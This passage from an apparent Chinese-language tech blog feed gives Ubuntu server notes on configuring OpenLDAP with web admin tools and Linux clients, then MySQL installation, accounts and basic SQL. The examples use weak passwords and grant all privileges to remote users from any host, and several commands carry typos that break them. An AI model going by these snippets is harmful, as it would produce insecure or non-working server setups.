轻量目录访问服务</p></blockquote><ul><li>命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称)</li><li>数据库基于键值对的方式存储数据</li><li>X.500标准的部分特性集, 各厂商不同</li><li>基于TCP/IP协议通信(TCP <code>389</code>)</li><li>可构建面向互联网和本地网络的目录服务</li></ul><p>最常见的LDAP服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 微软的活动目录 AD</span></span><br><span class="line">企业网络资源全部加入域，统一存储、统一呈现、统一管理、安全边界</span><br><span class="line"></span><br><span class="line"><span class="comment"># Novell eDirectory</span></span><br></pre></td></tr></table></figure></p><p><strong>命名空间</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全局路径： Distinguished Name (DN)</span></span><br><span class="line"><span class="comment"># 相对路径： Relative Distinguished</span></span><br><span class="line"><span class="comment"># 目录容器： Directory Container (DC)   每一层</span></span><br><span class="line"><span class="comment"># 组织单位:  Organisation Unit (OU)     通常按照部门划分</span></span><br><span class="line"><span class="comment"># 数据项： entries (object, class)</span></span><br><span class="line">        一组预先定义的属性集合</span><br><span class="line">        uid, 姓，名，帐号，邮箱，电话, 照片...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基础架构：Schema</span></span><br><span class="line">        objectClass 定义所有对象类型及其属性</span><br><span class="line">        Schame 可按应用需要扩展(美国对象在ASN.1结构中都有自己的位置 -- SNMP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用名： common name (CN)</span></span><br></pre></td></tr></table></figure></p><p><strong>传统命名空间</strong></p><ul><li>无固定的命名规则</li><li>按照地理空间命名</li></ul><p><img src="/ubuntu-server-LDAP/20200507135251359_1631864771.png" alt></p><p><img src="/ubuntu-server-LDAP/20200507135329746_833117774.png" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写法</span></span><br><span class="line">uid=babs, ou=People, dc=example, dc=com</span><br></pre></td></tr></table></figure></p><p><strong>LDAP协议</strong><br>LDAP最初作为TCP/IP客户udan与X.500目录服务网关之间发通信协议<br>LDAPv3:</p><ul><li>强身份认证和数据加密</li><li>基于证书的SSL加密</li><li>使用Unicode编码实现国际化</li><li>Schema可扩展</li></ul><h4 id="安装并配置LDAP"><a href="#安装并配置LDAP" class="headerlink" title="安装并配置LDAP"></a>安装并配置LDAP</h4><blockquote><p>拿出一台服务器作为专门的LDAP的服务器，以后的身份认证都使用集中的LDAP的(不局限与操作系统，<code>Web应用也可以</code>，只要程序支持ldap就可以使用这个做身份认证)</p></blockquote><p>先修改主机名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">'s/preserve_hostname:false /preserve_hostname:true /g'</span> /etc/cloud/cloud.cfg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"192.168.0.104 ldap.lab.com"</span> | sudo tee -a /etc/hosts  <span class="comment"># ip地址与名称的解析关系</span></span><br><span class="line"><span class="comment"># 修改主机名</span></span><br><span class="line">sudo hostnamectl <span class="built_in">set</span>-hostname ldap.lab.com</span><br><span class="line"></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></p><p>安装 OpenLDAP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu Linux中默认的LDAP实现</span></span><br><span class="line">sudo apt install slapd ldap-utils</span><br><span class="line"><span class="comment"># slapd 是服务端和后台进程(即LDAP server)</span></span><br><span class="line"><span class="comment"># ldap-utils  （ldap工具）</span></span><br><span class="line">    ldapadd       <span class="comment"># 添加数据</span></span><br><span class="line">    ldapdelete    <span class="comment"># 删除数据</span></span><br><span class="line">    ldapmodify    <span class="comment"># 修改</span></span><br><span class="line">    ldapsearch    <span class="comment"># 查询（最常使用）</span></span><br><span class="line">    ldappasswd    <span class="comment"># 修改密码</span></span><br><span class="line">    ... ...</span><br></pre></td></tr></table></figure></p><p>修改配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="comment"># sudo vim /etc/ldap/ldap.conf</span></span><br><span class="line">BASE    dc=lab,dc=com    <span class="comment"># 目前和dns的域名保持一直即可</span></span><br><span class="line">URI     ldap://ldap.lab.com:389    <span class="comment"># 可以通过这个地址对..进行查询</span></span><br></pre></td></tr></table></figure></p><p>初始化配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一次就够了!!!</span></span><br><span class="line">sudo dpkg-reconfigure slapd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以设置一次密码</span></span><br><span class="line"><span class="comment"># 数据库建议选择MDB</span></span><br></pre></td></tr></table></figure></p><p>验证<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多种验证方式</span></span><br><span class="line">sudo slapcat</span><br><span class="line"></span><br><span class="line">sudo tree /etc/ldap/slapd.d/   <span class="comment"># 有内容就可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认管理员帐号 admin</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -LLL -b dc=lab,dc=com </span><br><span class="line">ldapsearch -x -LLL -b dc=lab,dc=com dn  <span class="comment"># 后面的内容是筛选</span></span><br><span class="line"><span class="comment"># -x    简单身份验证</span></span><br><span class="line"><span class="comment"># -LLL  以标准LDIF文件格式显示结果</span></span><br><span class="line"><span class="comment"># -b    基地址</span></span><br></pre></td></tr></table></figure></p><p><strong>向目录中添加记录</strong><br>保存信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存信息到文件</span></span><br><span class="line"><span class="comment"># vim add.ldif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ou: 物理的层级结构划分</span></span><br><span class="line">dn: ou=People,dc=lab,dc=com</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: People</span><br><span class="line"><span class="comment"># 物理的</span></span><br><span class="line">dn: ou=Group,dc=lab,dc=com  <span class="comment"># ou的名称叫Group, 一个对象只能在一个ou中, ou是物理上的</span></span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: Group</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑的</span></span><br><span class="line"><span class="comment"># 组帐号s</span></span><br><span class="line">dn: cn=delevopment,ou=Group,dc=lab,dc=com   <span class="comment"># 创建一个组，cn别名</span></span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">cn: delevopment</span><br><span class="line">gidNumber: 3000</span><br><span class="line"><span class="comment"># 用户帐号</span></span><br><span class="line">dn: uid=zhangsan,ou=People,dc=lab,dc=com   <span class="comment"># 创建一个组，cn别名</span></span><br><span class="line">objectClass: inetOrgPerson    <span class="comment"># 继承某些对象类型</span></span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">uid: zhangsan</span><br><span class="line">sn: zhang</span><br><span class="line">givenName: san</span><br><span class="line">cn: san zhang     <span class="comment"># 别名</span></span><br><span class="line">displayName: San Zhang</span><br><span class="line">uidNumber: 2000</span><br><span class="line">gidNumber: 3000    <span class="comment"># 让用户加入某个组</span></span><br><span class="line">userPassword: 123465</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">homeDirectory: /home/zhangsan/</span><br></pre></td></tr></table></figure></p><p>导入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif</span><br><span class="line"><span class="comment"># -x    简单身份验证</span></span><br><span class="line"><span class="comment"># -D    指定管理员帐号(完整的别名： cn=admin,dc=lab,dc=com)   </span></span><br><span class="line"><span class="comment"># -W    提示输入密码</span></span><br><span class="line"><span class="comment"># -f    指定ldif文件</span></span><br></pre></td></tr></table></figure></p><p>验证<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -LLL -b dc=lab,dc=com <span class="string">'uid=zhangsan'</span> cn sn gidNumber uidNumber givenName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看属性类型和值 参考网址</span></span><br><span class="line">https://ldapwiki.com/wiki/ObkectClass<span class="comment">#Types</span></span><br></pre></td></tr></table></figure></p><p><strong>修改数据</strong><br>跟上面是类似的<br><img src="/ubuntu-server-LDAP/20200507151131491_1817511878.png" alt></p><h4 id="Web管理"><a href="#Web管理" class="headerlink" title="Web管理"></a>Web管理</h4><p>手动写配置太麻烦，图形化的简化了操作<br>Web应用程序(有很多种)： <code>ldap-account-manager</code> (lam)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br><span class="line">sudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring</span><br><span class="line"></span><br><span class="line">sudo a2enconf php7.2-cgi    <span class="comment"># 激活这个模块</span></span><br><span class="line">sudo systemctl reload apache2</span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line"></span><br><span class="line">sudo apt install ldap-account-manager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ldap-account-manager使用的数据库使用的是目录服务的数据库，但是他的数据也没有写到数据库中，而是存在了配置文件中</span></span><br><span class="line"><span class="comment"># 访问即可</span></span><br><span class="line"><span class="comment"># http:/192.168.0.104/lam</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击右上角 LAM configuration 配置  edit server... , 进行简单配置</span></span><br><span class="line"><span class="comment"># 其他配置根据自己需求来改</span></span><br></pre></td></tr></table></figure><p><img src="/ubuntu-server-LDAP/20200507155013573_1158190765.png" alt><br><img src="/ubuntu-server-LDAP/20200507153818370_1691714384.png" alt></p><p><img src="/ubuntu-server-LDAP/20200507153853899_1124405028.png" alt></p><p><strong>设置安全访问</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf</span><br><span class="line">    <span class="comment">#Require all granted    注释掉所有ip可访问</span></span><br><span class="line">    Require ip 127.0.0.1 192.168.0.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure></p><p><strong>其他ldap基于web的管理工具</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phpLDAPAdmin</span></span><br><span class="line">sudo apt install phpldapadmin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建组帐号 </span></span><br><span class="line"><span class="comment"># 创建帐号</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure></p><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><h6 id="Windows客户端"><a href="#Windows客户端" class="headerlink" title="Windows客户端"></a>Windows客户端</h6><p>win自带的<code>GINA</code>提供Windows系统登录界面， 支持本机、域账户登陆</p><p><code>pGina</code>开源身份认证提供者</p><pre><code>- 集成并替换window系统默认的GINA- 通过插件支持大量身份验证数据存储(LDAP, MySQL, RADIUS)- `http://pgina.org` 下载安装稳定版</code></pre><p>进行一些配置</p><h6 id="Linux客户端"><a href="#Linux客户端" class="headerlink" title="Linux客户端"></a>Linux客户端</h6><p>域名解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"192.168.0.104 ldap.lab.com"</span> |sudo trr -a /etc/hostss</span><br></pre></td></tr></table></figure></p><p>安装客户端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libnss-ldap libpam-ldap ldap-utils nscd</span><br><span class="line"><span class="comment"># 指定一些参数</span></span><br><span class="line">ldap://ldap.lab.com</span><br><span class="line">dc=lab,dc=com</span><br><span class="line">cn=admin,dc=lab,dc=com</span><br></pre></td></tr></table></figure></p><p>修改配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/nsswitch.conf</span></span><br><span class="line">passswd: compat systemd ldap</span><br><span class="line">group: compat systemd    ldap</span><br><span class="line">shadow: compat ldap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/pam.d/common-password</span></span><br><span class="line">    删除 use_authtok 这一小块</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/pam.d/common-session</span></span><br><span class="line">    session optional  pam_mkhomedir.so skel=/etc/skel <span class="built_in">umask</span>=077   <span class="comment"># 允许创建用户主目录</span></span><br><span class="line"> </span><br><span class="line">sudo systemctl restart nscd.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">getent passwd zhangsan </span><br><span class="line"></span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录的时候，点击 not list 才能进入刚才的帐号</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;LDAP&quot;&gt;&lt;a href=&quot;#LDAP&quot; class=&quot;headerlink&quot; title=&quot;LDAP&quot;&gt;&lt;/a&gt;LDAP&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;看书前先看目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;理解&quot;&gt;&lt;a href=&quot;#理
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="LDAP" scheme="http://www.xpshuai.cn/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server- ubuntu-server-数据库管理服务</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu server-数据库管理服务/</id>
    <published>2020-05-01T05:10:10.000Z</published>
    <updated>2020-05-01T07:26:30.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-server-数据库管理服务"><a href="#ubuntu-server-数据库管理服务" class="headerlink" title="ubuntu-server-数据库管理服务"></a>ubuntu-server-数据库管理服务</h1><blockquote><p>数据就是生产力</p></blockquote><p>数据就是应用的核心<br>按照结构组织，存储和管理数据的仓库<br>Oracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB</p><p><img src="/ubuntu server-数据库管理服务/20200430085915705_995731668.png" alt></p><h2 id="数据库管理系统-DBMS"><a href="#数据库管理系统-DBMS" class="headerlink" title="数据库管理系统(DBMS)"></a><font color="red">数据库管理系统(DBMS)</font></h2><p><img src="/ubuntu server-数据库管理服务/20200430090504409_350097281.png" alt></p><h2 id="MySQL数据库管理"><a href="#MySQL数据库管理" class="headerlink" title="MySQL数据库管理"></a><font color="red">MySQL数据库管理</font></h2><p><img src="/ubuntu server-数据库管理服务/20200430091905869_1159836654.png" alt></p><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server</span><br></pre></td></tr></table></figure></p><p>安全配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br><span class="line"><span class="comment"># 建议禁止root远程登录</span></span><br><span class="line"><span class="comment"># 这里设置的root的密码不是，后面才设置, 因为初始身份认证方式是auth_socket</span></span><br></pre></td></tr></table></figure></p><p>Root帐号密码登录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql    <span class="comment"># 初始身份认证方式是auth_socket，所以暂时不需要输入密码 </span></span><br><span class="line">SELECT user,host,authentication_string, plugin,host FROM mysql.user;</span><br><span class="line"><span class="comment"># 给root设置密码认证方式mysql_native_password</span></span><br><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED WITH mysql_native_password BY <span class="string">'12345678'</span>; </span><br><span class="line">FULSH PRIVILEGES;</span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p><p>创建数据库个人帐号(建议不要使用root进行运行,而应该使用个人帐号, 且密码不能相同)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create user <span class="string">'xps'</span>@<span class="string">'%'</span> identified by <span class="string">'12345678'</span>;</span><br><span class="line"><span class="comment"># 赋予权限(4级)</span></span><br><span class="line"><span class="comment"># *.* 是哪个库哪个表，这里表示所有库所有表</span></span><br><span class="line">grant all privileges on *.* to <span class="string">'xps'</span>@<span class="string">'%'</span> with grant option;</span><br></pre></td></tr></table></figure></p><p>修改密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> password <span class="keyword">for</span> <span class="string">'xps'</span>@<span class="string">'%'</span>=password(<span class="string">'12345678'</span>);</span><br></pre></td></tr></table></figure></p><p>网络访问帐号(可以远程访问)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一般这种情况，都限制要操作的库和操作</span></span><br><span class="line"><span class="comment"># %</span></span><br><span class="line">use mysql</span><br><span class="line"><span class="comment"># 直接grant赋予权限，就可以创建不存在的用户</span></span><br><span class="line">grant all privileges on *.* to admin@<span class="string">'%'</span> identified by <span class="string">'12345678'</span> with grant option;</span><br><span class="line"><span class="comment"># 移除权限</span></span><br><span class="line">revoke all on db_name from user_name;</span><br><span class="line"><span class="comment"># 查看密码策略(一旦允许网络连接，密码级别就会变成中安全级别了)</span></span><br><span class="line">select @@validate_password_policy;</span><br></pre></td></tr></table></figure></p><p>编辑配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</span></span><br><span class="line"><span class="comment"># 修改侦听网卡为自己网卡的ip地址</span></span><br><span class="line"><span class="built_in">bind</span>-address        = 192.168.0.112</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启网卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用mysql客户端连接， 或Falcon等图形化客户端</span></span><br><span class="line">mysql -h 19.168.0.112 -u root</span><br></pre></td></tr></table></figure></p><h2 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a><font color="red">SQL语句</font></h2><h4 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h4><p><strong>最基本</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 当前帐号</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看已经有的库</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">databases</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 选取(切换)库</span></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 显示表(已选择库)</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 简单创建库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure></p><p><strong>创建表</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span> AUTO_INCREMENT,  </span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">CHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    pass <span class="built_in">CHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    age <span class="built_in">INT</span>(<span class="number">9</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line"> )</span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-数据库管理服务/20200430105007407_399865569.png" alt><br>char的性能要优于varchar</p><p><strong>插入记录</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'xps'</span>,<span class="string">'1234567890'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,<span class="keyword">name</span>,pass,age) <span class="keyword">values</span>(<span class="literal">null</span>,<span class="string">'xps'</span>,<span class="string">'1234567890'</span>,<span class="number">20</span>);   <span class="comment"># 指定列</span></span><br></pre></td></tr></table></figure></p><p><strong>查看表结构</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">desc users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>;   <span class="comment"># Engine=InnoDB   存储引擎</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure></p><p><strong>查询</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * frm <span class="keyword">users</span> <span class="keyword">where</span> age &lt;<span class="number">20</span> <span class="keyword">and</span> age &gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,pass <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> age;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,pass <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>;  <span class="comment"># 降序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">name</span>,<span class="number">0x7e</span>,pass,<span class="number">0x7e</span>) <span class="keyword">as</span> user_pass <span class="keyword">from</span> <span class="keyword">users</span>;   <span class="comment"># concat 结合， 表头变成user_pass</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">name</span>, pass) <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure></p><p><strong>修改记录</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> <span class="keyword">name</span>=<span class="string">'xpsss'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p><p><strong>删除记录</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p><p><strong>删除表</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> tests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> tests;</span><br></pre></td></tr></table></figure></p><p><strong>删除库</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure></p><p><strong>查看数据引擎</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">engines</span>;</span><br><span class="line"><span class="comment"># 